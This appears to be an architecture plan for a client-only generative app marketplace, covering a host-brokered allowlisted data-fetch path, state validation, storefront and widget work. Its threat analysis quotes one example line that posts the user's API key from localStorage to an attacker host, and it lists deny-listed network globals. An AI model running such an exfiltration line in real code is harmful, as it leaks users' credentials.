# Architecture Research — v1.1 "Real & Robust"

**Domain:** Client-only generative app marketplace (browser SPA, no server) — integrating four NEW features into an EXISTING architecture
**Researched:** 2026-06-25
**Confidence:** HIGH (every integration point cites a read file; the two keyless data endpoints are verified live)

> This document is a **milestone integration architecture**, not a greenfield survey. It studies the real v1.0/v1.1 code and proposes, for each of the four target features: integration points (real files), new-vs-modified components, data-flow changes, and a dependency-aware build order. The hard problem — a sanctioned network-data path that does not break the CSP/key-exfiltration posture — is addressed first and in depth.

---

## Standard Architecture (as built — the substrate we extend)

### System Overview

```
┌──────────────────────────────────────────────────────────────────────┐
│  UI LAYER  (src/ui/)                                                   │
│  Marketplace ─ AppShell ─ WidgetShell ─ ContextualPrompt ─ KeyDialog   │
│      │ handleOpen / handleModify                                       │
├──────┼────────────────────────────────────────────────────────────────┤
│  INTENT  (src/intent/)         resolveOpenApp → Intent{cacheKey}       │
│      │                          routeModification → remove/clone/tweak │
├──────┼────────────────────────────────────────────────────────────────┤
│  EXECUTION  (src/execution/)                                          │
│   loader.ts  ── 3-tier resolve (live → session → registry → produce)  │
│      ├─ instantiateApp(mode)                                          │
│      │     ├─ "app"        → instantiateWithWidgets → instantiate()   │
│      │     └─ "delegated"  → instantiateDelegated → DelegatedShell    │
│      ├─ prewarmWidgets ── widgetParse (@widget) ── produceComponent   │
│      └─ runHandler ── resolve-or-produce-then-exec (constrained scope)│
│   producer.ts ── buildPrompt(kind) → callModel → extractCode →        │
│                  transpile → self-heal(≤3)                            │
├──────────────────────────────────────────────────────────────────────┤
│  HOST  (src/host/)   modelClient (SINGLE egress) ─ resilientTransport  │
│                      tokenBucket ─ backoff ─ produceGate ─ storage     │
├──────────────────────────────────────────────────────────────────────┤
│  SERVICES (src/services/)  IoC bundle: { transport, registry,         │
│                            getApiKey, produceGate, storage }          │
├──────────────────────────────────────────────────────────────────────┤
│  REGISTRY (src/registry/)  cacheKey(registryKey folds kind+type+prompt)│
│   IndexedDB "MarketplaceRegistry" v2 → stores: apps │ widgets │ handlers│
└──────────────────────────────────────────────────────────────────────┘
        ▲ generated code runs in new Function() with fetch/XHR/window/
        │ document/localStorage SHADOWED to undefined (containment-by-convention)
   CSP: connect-src 'self' https://api.anthropic.com   (key-exfil mitigation)
```

### Component Responsibilities (touch-point map for v1.1)

| Component | Owns | File |
|-----------|------|------|
| `resolveComponent` | 3-tier resolve → produce → cache → instantiate-by-mode | `src/execution/loader.ts:173` |
| `instantiateApp` | dispatch `mode: "app"｜"delegated"` | `src/execution/loader.ts:129` |
| `DelegatedShell` | state SSOT, container click-delegate, merge step | `src/execution/delegated.tsx:162` |
| `buildActionIntent` | stable per-`(appType, action)` intent (embeds actionSpec) | `src/execution/delegated.tsx:135` |
| `runHandler` | resolve-or-produce-then-exec; constrained scope (`DENIED_GLOBALS`) | `src/execution/handler.ts:249` |
| `executeHandler` | `new Function(...DENIED_GLOBALS, "input", body)` exec | `src/execution/handler.ts:100` |
| `produceComponent` | prompt → extract → transpile → self-heal, by `ProduceKind` | `src/execution/producer.ts:391` |
| `buildPrompt` | per-kind prompt text (`app/widget/handler/shell/delegated`) | `src/execution/producer.ts:87` |
| `prewarmWidgets` | transitive `@widget` resolve (cycle-guard, ≤2 concurrency) | `src/execution/widgetPrewarm.ts:187` |
| `registryKey` | `SHA-256(kind ␟ type ␟ prompt)` — already folds all three | `src/registry/cacheKey.ts:51` |
| `AppRecord / WidgetRecord / HandlerRecord` | store schemas (latter two are `Record<string,unknown>` stubs) | `src/registry/db.ts:30-38` |
| `Services` | IoC seam — the ONLY place a new dependency (e.g. `fetchData`) is wired | `src/services/services.ts:30` |
| `Marketplace` | storefront grid, `handleOpen`, popularity row touch point | `src/ui/Marketplace.tsx:131` |
| `APP_REGISTRY` | static storefront catalog (`displayName`/`description`/`icon`) | `src/data/appRegistry.ts:11` |
| CSP `<meta>` | `connect-src 'self' https://api.anthropic.com` | `index.html:13-16` |

---

## Feature A — Sanctioned network-data path  (THE HARD ONE)

### The constraint collision, stated head-on

Three invariants currently make live data **impossible** inside a generated app, by design:

1. **Handler scope shadows the network.** `executeHandler` builds `new Function("module","exports","require", ...DENIED_GLOBALS, "input", body)` where `DENIED_GLOBALS = [fetch, XMLHttpRequest, localStorage, sessionStorage, indexedDB, window, document]` (`handler.ts:69-77`). Inside the body those names resolve to `undefined` parameters. A handler **literally cannot call `fetch`** — Weather/Currency degrade to fabricated fallback data.
2. **`require` is hostile.** The handler's `requireShim` throws on every specifier (`handler.ts:109`), and the producer rejects any handler whose transpiled output contains `require(` (`producer.ts:471`). No SDK escape hatch exists.
3. **CSP pins egress.** `connect-src 'self' https://api.anthropic.com` (`index.html:15`). This is **the key-exfiltration mitigation**: the user's Anthropic key lives in `localStorage`; if generated code could reach `window`/`fetch` AND CSP allowed arbitrary `connect-src`, a hallucinated/hostile component could `fetch('https://attacker.example', { body: localStorage.getItem('marketplace.apiKey') })`. The narrow `connect-src` is the last line of defense even though `new Function` is only containment-by-convention.

**Naively "just let handlers fetch" detonates all three** — it un-shadows the network in untrusted scope AND forces `connect-src` open. That is the wrong move.

### Recommended design: HOST-BROKERED, ALLOWLISTED `fetchData(sourceId, params)`

The host (trusted code), not the generated code, performs the network call against a **curated allowlist of keyless, CORS-friendly endpoints**. The generated code only ever names a *source id* and *params*; it never sees a URL, a header, `fetch`, or the Anthropic key.

```
GENERATED (untrusted)                HOST (trusted)                    NETWORK
─────────────────────                ──────────────                    ───────
handler body / view spec             fetchData(sourceId, params)
   await fetchData("weather",  ───▶  1. look up DATA_SOURCES[sourceId]  (manifest)
        { lat, lon })                2. validate params (schema)
                                     3. build URL from TEMPLATE only ──▶ api.open-meteo.com
                                        (no caller-supplied origin)        (keyless, CORS)
                                     4. fetch() here, in host scope   ◀── JSON
   ◀── { data } | { error }   ◀──    5. shape + return plain data
```

**Why this is safe on all three axes:**

- **The Anthropic key never enters app scope.** `fetchData` is a host closure (like `runHandler` is today — `loader.ts:116`). The key is read only by `getApiKey` inside `modelClient`; `fetchData` closes over a curated manifest, not the key. The generated code is handed a *bound function*, exactly the pattern already proven for `runHandler`.
- **The URL is host-built from a template, never caller-supplied.** `DATA_SOURCES[sourceId].buildUrl(params)` is the ONLY way a URL is formed. Generated code cannot point the host at `attacker.example` because it never supplies an origin — only a `sourceId` that must exist in the manifest and `params` that are validated/encoded by the host. SSRF-by-prompt is structurally impossible.
- **CSP widens to an EXPLICIT, finite allowlist — never `*`.** Because every reachable origin is known at build time (it is the manifest's origin set), the CSP becomes:
  `connect-src 'self' https://api.anthropic.com https://api.open-meteo.com https://api.frankfurter.dev;`
  This is the crucial property: **we widen `connect-src` to a vetted, enumerable set of keyless data endpoints, NOT to `*`.** A hostile component that *did* break containment still cannot POST the key anywhere — every allowlisted origin is a keyless GET-only public data API that we chose, none of which we authenticate to, so exfiltration to them is inert (they ignore an unknown body; they hold no attacker inbox). The exfiltration surface added is exactly "can leak to two public weather/FX read APIs," which is not a credential sink.

**Verified concrete allowlist (keyless + CORS, browser-direct, June 2026):**

| sourceId | Origin | Keyless? | CORS? | Use |
|----------|--------|----------|-------|-----|
| `weather` | `https://api.open-meteo.com` | yes (no key, no signup) | yes (CORS out of the box) | Weather app — forecast by lat/lon |
| `geocode` | `https://geocoding-api.open-meteo.com` | yes | yes | place-name → lat/lon for Weather |
| `currency` | `https://api.frankfurter.dev` | yes (84 central banks) | yes | Currency app — live FX rates |

> All three are **GET-only, keyless, CORS-enabled** public read APIs — verified live (sources below). Critically: none require a credential, so adding them to `connect-src` introduces no new credential sink. This is what makes the CSP widening safe rather than reckless.

**Where it hooks in (mechanically):**

1. NEW `src/host/dataSources.ts` — the **manifest**: `Record<sourceId, { origins: string[]; buildUrl(params): string; validate(params): boolean; shape(json): unknown }>`. Pure host code; the single place any external read origin is named (mirroring how `modelClient.ts` is the single Anthropic-egress chokepoint).
2. NEW `fetchData(sourceId, params): Promise<{ data?, error? }>` in `src/host/dataBroker.ts` — performs the host-side `fetch`, maps failures to a neutral `{ error }` (hygiene parity with `runHandler`). Honors a host timeout + the existing rate posture (can reuse `tokenBucket` semantics or a dedicated lighter limiter; data GETs are cheaper than model calls).
3. MODIFY `Services` (`services.ts:30`) — add `fetchData: FetchData`. Wire the real impl in `createServices` (`services.ts:88`). Tests inject a canned `fetchData` (no network), preserving the offline-test invariant.
4. MODIFY the **handler scope** (`handler.ts`): add `fetchData` to the injected params of `executeHandler`, AND **keep `fetch`/`XMLHttpRequest` shadowed** — `fetchData` is the sanctioned replacement; raw `fetch` stays banned. `runHandler` binds `services.fetchData` and passes it positionally (exactly as it could bind `services` today). The hostile `require` and the produce-time `require(` reject stay unchanged.
5. MODIFY the **delegated path** (`delegated.tsx`): the per-action handler produced via `buildActionIntent` already runs through `runHandler`, so handlers gain `fetchData` for free once (4) lands. For data on *initial* render (Weather shows a forecast before any click), add an optional `data-action` the shell fires once on mount (a "load" action), OR let the produced `actionSpec` declare an init action — keep KISS: a mount-fire of a conventional `init`/`load` action reuses the existing merge step (`delegated.tsx:183`) with zero new merge machinery.
6. MODIFY `index.html` CSP `connect-src` to the explicit allowlist; MODIFY `src/csp.test.ts` (the existing guard) to assert the exact origin set so the allowlist can't silently drift.
7. MODIFY the producer prompts (`producer.ts buildPrompt`): teach the `handler` and `delegated` kinds that `fetchData("<sourceId>", params)` is an in-scope global for live data, with the **exact source ids enumerated** and a NO-OP rule (most apps need none) — directly applying the CONSULT-activating-widgets guidance (declaration-as-CoT-anchor, helpers-as-globals, mandatory negative constraints). Hygiene: phrasing avoids the banned lexicon.

**Self-heal note:** a `fetchData` to an unknown `sourceId` returns `{ error }` (not a throw), so a hallucinated source id degrades to the existing keep-prior-state path — never a crash, never a mechanic leak.

### Alternatives considered (and why brokered allowlist wins)

| Approach | How it works | Verdict |
|----------|--------------|---------|
| **Host-brokered `fetchData` + allowlist** (RECOMMENDED) | Host fetches against curated keyless origins; URL host-built; key never in app scope; CSP → explicit finite allowlist | **Chosen.** Key-safe, SSRF-safe, CSP stays enumerable, reuses the `runHandler`-style bound-closure pattern already in the codebase. |
| **Per-app declared data-source manifest** (app declares `// @source weather` like `@widget`) | Producer emits a source declaration; host pre-validates declared sources before mount | **Adopt as a COMPLEMENT, not a substitute.** Good for CSP pre-flight/telemetry and for priming the model (CoT anchor). But it does not itself perform the fetch safely — it still needs the brokered executor. Use the `@source` parse only to *gate which sourceIds an app may call*; the broker remains the trust boundary. Lower priority than the broker itself. |
| **`postMessage` to host** | Generated code runs in an iframe; posts data requests to parent which brokers the fetch | **Right end-state, wrong milestone.** This is the HARD-01 iframe model (deferred to v2). It is strictly *more* isolating than `fetchData` (opaque origin → no `localStorage` access at all), but it requires shipping React into the frame, re-injecting theming per frame, and a message protocol. Build `fetchData` now behind a seam so swapping to a postMessage-brokered `fetchData` later is contained. |
| **Keep raw `fetch` banned forever (status quo)** | Network apps fabricate fallback data | **Reject for v1.1** (it is the explicit gap this milestone closes) but **keep raw `fetch` itself banned forever** — the broker is the sanctioned path; un-shadowing raw `fetch` is never on the table. |

**The CSP/key-exfiltration tradeoff, explicitly:** we accept widening `connect-src` from `{self, anthropic}` to `{self, anthropic, open-meteo, frankfurter, open-meteo-geocode}`. The risk delta is "generated code could leak data to three public keyless read APIs we picked." Since none authenticate us, none is a credential sink, and the Anthropic key never leaves `localStorage`/`modelClient`, the *exfiltration value* of the new origins is ~zero. We explicitly do **not** widen to `*`, do **not** allow caller-supplied origins, and do **not** un-shadow raw `fetch`. The broker pattern converts "arbitrary egress" into "three enumerable inert GET sinks" — a strict, auditable improvement over any scheme that hands the network to generated code.

---

## Feature B — Reliability hardening (delegated state/actionSpec correctness)

The delegated loop already has the right SSOT shape (shell owns state, intent embeds `actionSpec`, merge keeps-prior on failure). The reliability gap is that **a produced handler can return a wrong-shaped or partial state and the merge accepts it blindly**: `setState(prev => ({ ...prev, ...next }))` (`delegated.tsx:182-184`) merges any object, including one with hallucinated keys (`display` vs `value`) or coerced types — exactly the drift the CONSULT flagged.

**Three hook points (build cheapest-first):**

| Hook | Where | What | Cost |
|------|-------|------|------|
| **1. Validate at the merge step** (RECOMMENDED first) | `DelegatedShell.onClick`, `delegated.tsx:182-184` | Before merging, validate `next` against the **key set + value types of `module.initialState`** (the SSOT shape is already in hand). Reject/keep-prior on extra keys or type mismatch; merge only known keys. | Low — pure, no model call, no schema language. The initialState IS the schema. |
| **2. Stronger actionSpec contract the producer enforces** | `producer.ts buildPrompt("delegated")` + `instantiateDelegated` (`delegated.tsx:59`) | Require the delegated module to export a machine-checkable shape (the `initialState` is already canonical; optionally a typed field list). Enforce at instantiate: reject a module whose `view` reads keys absent from `initialState`. | Medium — tightens the contract; some can be a lint-style check on the source. |
| **3. Self-heal on a bad transition** | `DelegatedShell` + `runHandler` | When validation (hook 1) rejects a returned state, optionally re-issue the action intent once with the validation error appended (mirroring the producer's compiler-error self-heal at `producer.ts:499`), then keep-prior if it still fails. | Higher — adds a model round-trip on the interaction hot path; gate behind a single retry and the produceGate so it can't storm. |

**Recommendation:** ship hook 1 (merge-step validation against `initialState`) as the backbone — it is cheap, pure, testable offline, and converts "silent drift" into "deterministic keep-prior." Layer hook 3 (one self-heal retry) only if real-Haiku fixtures show frequent recoverable drift. Hook 2 is a producer-prompt tightening that rides along with the prompt edits already needed for Feature A.

**New vs modified:** NEW `src/execution/stateContract.ts` (pure `validateTransition(initialState, next): { ok; merged }`). MODIFIED: `delegated.tsx` merge step calls it; optionally `producer.ts` delegated prompt; optionally one retry path in `DelegatedShell`. No registry/schema changes.

---

## Feature C — Richer storefront (G5 displayName/prompt + POP-01 popularity row)

This is the lowest-risk feature and a clean schema extension.

**Data-flow change (persist on produce/write):**

| Field | Today | v1.1 |
|-------|-------|------|
| `displayName` | only in static `APP_REGISTRY` | also persisted on `AppRecord` so produced/tweaked variants keep a faithful label |
| `prompt` | dropped (key folds it, but the text isn't stored) | persisted on `AppRecord` for faithful re-produce + storefront copy |
| `description` | only in `APP_REGISTRY` | optionally persisted for produced apps |
| `useCount` | **already persisted** (`db.ts:20`, bumped on every hit in `loader.touchRecord` and `handler.touchHandler`) | **drives the popular row — no new write needed** |

**Integration points:**

- MODIFY `AppRecord` (`db.ts:30`) — add optional `displayName?`, `prompt?`, `description?`, `createdAt?`. Additive, no DB version bump required (the interface already has `[key: string]: unknown` forward-compat and the adapter tolerates missing fields). If you want a `by-useCount` index for an efficient popular query, that IS a `REGISTRY_DB_VERSION` bump (`db.ts:13`) with an additive `createObjectStore`/`createIndex` in `upgrade` (`db.ts:51`).
- MODIFY the loader's two `registry.put` sites (`loader.ts:286` produce-write, `loader.ts:55` touch-write) and the tweak path to carry `displayName`/`prompt`. The values flow in from `Marketplace.handleOpen` (which already has `displayName`, `Marketplace.tsx:146`) and `handleModify` (which has `routed.instruction` as the prompt).
- NEW query: `topByUseCount(limit)` in `src/registry/` (or a small `src/data/popular.ts`) — reads `apps` keys (`registry.keys`, `registry.ts:95`), sorts by `useCount` desc, returns the top N records' `{type, displayName}`. KISS: a full scan is fine at this scale (tens of records); add the index only if needed.
- NEW UI: a "Popular on the platform" row in `Marketplace.tsx` above the grid, mapping `topByUseCount` results to the existing `app-card` markup. Hygiene: copy must avoid the banned lexicon and not narrate the mechanic. Empty-state: hide the row until ≥1 app has `useCount > 0`.

**New vs modified:** NEW `src/data/popular.ts` (or registry query) + a row in `Marketplace.tsx`. MODIFIED: `db.ts` (`AppRecord` fields; optional version bump for an index), loader/tweak `put` sites. No execution-engine change.

---

## Feature D — Activate widgets (G3 typing + G1-followups cache key)

The widget machinery is **built but dormant**: `prewarmWidgets` (`widgetPrewarm.ts:187`), `parseWidgetDeps` (`widgetParse.ts:36`), and `useWidget` injection (`instantiate.ts:41`) all work and are tested — but the **delegated default never declares `@widget`** (the delegated module is a behavior-free view; only the monolithic `"app"` prompt mentions widgets, `producer.ts:200`). Activating widgets for delegated apps is the open work.

**Sub-parts and integration points:**

1. **Make delegated apps declare/use widgets.** The delegated `view(state)` returns markup; it has no `useWidget` in scope (only the monolithic `instantiate` injects `useWidget`/`runHandler`). Two paths:
   - (a) Pre-warm declared widgets from the **delegated module source** before mounting `DelegatedShell` (run `prewarmWidgets(source, services)` in the `"delegated"` branch of `instantiateApp`, `loader.ts:136`), and inject the resulting widget map into the view scope. Requires `instantiateDelegated` to optionally bind a `useWidget` the view can call. MODIFY `delegated.tsx:59` and the delegated prompt to permit `// @widget` + a `useWidget` call inside `view`.
   - (b) KISS alternative: keep `view` widget-free for v1.1 and only activate widgets on the **monolithic** path (already wired). Lower value but zero delegated-path risk. **Recommend (a)** since the milestone goal is first-class widget composition for the default (delegated) apps.
2. **Type `WidgetRecord` / `HandlerRecord`** (`db.ts:37-38`). Replace `Record<string, unknown> & LruMeta` with real schemas mirroring `AppRecord`: `{ cacheKey; type; source; transpiledJS } & LruMeta` for widgets; `{ cacheKey; intent; source; transpiledJS } & LruMeta` for handlers (the handler write at `handler.ts:214` and widget write at `widgetPrewarm.ts:99` already produce exactly these shapes — the types just lag the data). Pure type tightening; will surface any field drift at `tsc` time.
3. **Fully fold `kind` + prompt into the widget cache key (G1-followups).** `registryKey(kind, type, prompt)` (`cacheKey.ts:51`) **already folds all three correctly** — and `resolveWidget` already calls `registryKey("widget", widgetType)` (`widgetPrewarm.ts:61`) and `resolveWidgetTweak` calls `registryKey("widget", widgetType, instruction)` (`widgetPrewarm.ts:133`). So the keying primitive is done. The G1-followups risk is the **latent bare-`SHA-256(type)` collision** noted in PROJECT.md: audit that **no remaining call path** keys a widget/handler by type alone, and that a widget and an app of the same slug (e.g. both `"chart"`) get distinct keys (they do — kind is folded). The work is an **audit + tests** proving (a) app `chart` ≠ widget `chart` key, (b) widget `chart` baseline ≠ widget `chart` + tweak key — not new keying code.

**New vs modified:** Mostly MODIFIED — `db.ts` (real record types), `delegated.tsx` + `instantiateDelegated` (+optional `useWidget` in view), the delegated prompt (`producer.ts`), `loader.ts` delegated branch (pre-warm). NEW: cache-key collision tests. The hardest part is (1a) wiring `useWidget` into the delegated view scope; everything else is typing + an audit.

---

## Data-Flow Changes (summary)

```
A (network data):
  view/handler ─ fetchData(sourceId, params) ─▶ Services.fetchData ─▶ dataBroker
        ─▶ dataSources[sourceId].buildUrl ─▶ host fetch ─▶ allowlisted keyless origin
        ◀─ { data } | { error }  (key never in this path; URL host-built)

B (reliability):
  DelegatedShell.onClick ─ runHandler ─▶ { data:{ state } }
        ─▶ validateTransition(initialState, next) ─▶ merge known keys | keep-prior

C (storefront):
  produce/touch write ─▶ AppRecord{ +displayName,+prompt,+createdAt, useCount }
  Marketplace mount ─ topByUseCount(N) ─▶ "Popular" row

D (widgets):
  delegated produce ─ source(@widget) ─▶ prewarmWidgets ─▶ useWidget map ─▶ view scope
  registryKey(kind,type,prompt) keeps app/widget/tweak keys distinct (already correct)
```

---

## Suggested Phase Build Order (dependency-aware)

> Ordering principle: ship the **highest-value, lowest-coupling** slice first; do the schema/typing groundwork before the features that depend on it; tackle the hard network path on a clean base.

1. **Phase 1 — Storefront depth (Feature C).** *No dependencies; lowest risk; immediately visible.* Persist `displayName`/`prompt`/`createdAt` on `AppRecord`, add `topByUseCount`, render the popular row. Establishes the additive-schema-change muscle and gives a quick win. (`useCount` already persists, so the popular row is nearly free.)

2. **Phase 2 — Schema & key hardening (Feature D, parts 2+3).** *Foundation for D and a guardrail for everything.* Replace `WidgetRecord`/`HandlerRecord` stubs with real types; add the cache-key collision audit + tests (app `chart` ≠ widget `chart`; baseline ≠ tweak). Pure typing/tests — de-risks later phases that read these stores. Do this **before** activating widgets so the activation lands on typed records.

3. **Phase 3 — Reliability hardening (Feature B).** *Depends on nothing new; should precede the network path so live-data transitions are validated.* Add `stateContract.validateTransition`, wire it into the `DelegatedShell` merge step, add deterministic tests with captured handlers. Optionally one self-heal retry. This makes the merge step trustworthy **before** it starts merging network-derived state in Feature A.

4. **Phase 4 — Sanctioned network-data path (Feature A).** *The hard one; built last on a validated base.* Add `dataSources` manifest + `dataBroker.fetchData`, extend `Services`, inject `fetchData` into the handler/delegated scope, widen CSP to the explicit allowlist (+ update `csp.test.ts`), teach the prompts the `fetchData` global with NO-OP rules, fire a mount `load` action for initial data. Lands on Phase 3's validated merge (so live data can't drift state) and Phase 2's typed handler records.

5. **Phase 5 — Activate widgets in delegated views (Feature D, part 1).** *Depends on D's typing (Phase 2) and benefits from a stable producer prompt (Phases 3-4 already edited prompts).* Wire `prewarmWidgets` + a `useWidget` accessor into the delegated `view` scope; update the delegated prompt to permit `// @widget`. Last because it touches the delegated render path that Phases 3-4 also evolve — sequencing it after avoids churn/merge conflicts on `delegated.tsx`.

**Dependency rationale:** C is independent and fast → first. D's typing (2) is a foundation gate. B (3) must precede A (4) so network-derived state is validated by an already-trusted merge step. A (4) precedes D's widget-activation (5) only to keep `delegated.tsx` edits serialized (both touch the same file) and because the prompt edits compound. The only hard ordering constraints are **B before A** (validate before merging live data) and **D-typing (2) before D-activation (5)**; the rest optimizes for low merge-conflict churn on `delegated.tsx`/`producer.ts`.

---

## Anti-Patterns (v1.1-specific)

### Anti-Pattern 1: Un-shadowing `fetch` in the handler scope to enable live data
**What people do:** add `fetch` back to the handler's reachable globals (remove it from `DENIED_GLOBALS`).
**Why it's wrong:** restores arbitrary egress in untrusted scope AND forces `connect-src '*'` — re-opening the exact key-exfiltration hole the CSP closes.
**Do this instead:** inject the host-bound `fetchData(sourceId, params)`; keep `fetch`/`XMLHttpRequest` shadowed forever; widen CSP only to enumerable keyless origins.

### Anti-Pattern 2: Letting generated code supply the URL/origin
**What people do:** `fetchData(url, opts)` where the model writes the full URL.
**Why it's wrong:** SSRF-by-prompt — a hallucinated/hostile URL points the trusted host at an attacker origin, defeating the allowlist.
**Do this instead:** the model supplies only a `sourceId` (must exist in the manifest) + params; the host builds the URL from a template.

### Anti-Pattern 3: Trusting the returned state shape at the merge step
**What people do:** `setState(prev => ({ ...prev, ...next }))` with no validation (today's behavior).
**Why it's wrong:** a drifting handler injects hallucinated keys / coerced types → silent state corruption.
**Do this instead:** `validateTransition(initialState, next)` — merge only keys present in the SSOT with matching types; keep-prior otherwise.

### Anti-Pattern 4: Re-implementing the widget cache key
**What people do:** "fix G1" by writing a new keying function for widgets.
**Why it's wrong:** `registryKey` already folds `kind+type+prompt` correctly; the risk is a *latent bare-type call path*, not the primitive.
**Do this instead:** audit call sites + add collision tests; do not touch `cacheKey.ts`.

---

## Integration Points

### External Services

| Service | Integration Pattern | Notes |
|---------|---------------------|-------|
| Anthropic Messages API | existing single egress (`modelClient.ts`), key from `localStorage`, browser-direct header | unchanged; remains the only authenticated origin |
| Open-Meteo (`api.open-meteo.com`) | NEW host-brokered GET via `dataBroker`, keyless, CORS | weather forecast by lat/lon; add to `connect-src` |
| Open-Meteo Geocoding | NEW host-brokered GET, keyless, CORS | place-name → lat/lon for Weather |
| Frankfurter (`api.frankfurter.dev`) | NEW host-brokered GET, keyless, CORS | live FX; add to `connect-src` |

### Internal Boundaries

| Boundary | Communication | Notes |
|----------|---------------|-------|
| generated code ↔ host data | `fetchData(sourceId, params)` bound closure (like `runHandler`) | key never crosses; URL host-built |
| `DelegatedShell` ↔ produced handler | `runHandler` intent + `{state,payload}` → `{data:{state}}`, now validated | add `validateTransition` at merge |
| loader ↔ registry stores | `Services.registry` get/put, now with typed `WidgetRecord`/`HandlerRecord` | typing only; shapes already match |
| `Marketplace` ↔ registry | NEW `topByUseCount` read for the popular row | full-scan acceptable at this scale |
| `Services` ↔ everything | NEW `fetchData` member; IoC seam for test substitution | preserves offline-test invariant |

---

## Sources

- Existing code (read 2026-06-25, HIGH): `src/execution/{loader.ts,delegated.tsx,handler.ts,instantiate.ts,producer.ts,widgetParse.ts,widgetPrewarm.ts}`, `src/registry/{db.ts,cacheKey.ts,registry.ts}`, `src/services/services.ts`, `src/host/modelClient.ts`, `src/data/appRegistry.ts`, `src/ui/Marketplace.tsx`, `index.html`, `.planning/PROJECT.md`
- Prior research consults (HIGH, in-repo): `.planning/research/CONSULT-thin-shell-on-demand-handlers.md`, `.planning/research/CONSULT-activating-widgets-handlers.md`
- [Open-Meteo — free weather API, no key, CORS supported](https://open-meteo.com/) — MEDIUM-HIGH (cross-confirmed by repo + multiple dev write-ups)
- [Open-Meteo GitHub](https://github.com/open-meteo/open-meteo) — MEDIUM-HIGH
- [Frankfurter — free FX API, no key, public](https://frankfurter.dev/) — MEDIUM-HIGH (84 central banks, no quotas)

---
*Architecture research for: Vibe App Store v1.1 "Real & Robust" — four-feature integration into the existing client-only generative marketplace*
*Researched: 2026-06-25*
